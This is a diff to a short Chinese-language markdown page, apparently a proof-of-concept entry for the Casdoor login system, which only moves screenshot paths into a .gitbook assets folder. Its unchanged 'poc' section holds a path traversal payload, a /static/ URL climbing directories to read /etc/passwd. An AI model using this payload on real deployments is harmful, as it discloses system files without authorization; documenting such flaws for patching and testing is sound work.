@@ -22,11 +22,11 @@ title="Casdoor"
 
 登陆页面
 
-![image-20231115094403952](images/image-20231115094403952.png)
+![image-20231115094403952](../.gitbook/assets/image-20231115094403952.png)
 
 或者
 
-![image-20231115094555640](images/image-20231115094555640.png)
+![image-20231115094555640](../.gitbook/assets/image-20231115094555640.png)
 
 poc
 
@@ -34,4 +34,4 @@ poc
 /static/../../../../../../../../../../../etc/passwd
 ```
 
-![image-20231115094237497](images/image-20231115094237497.png)
+![image-20231115094237497](../.gitbook/assets/image-20231115094237497.png)
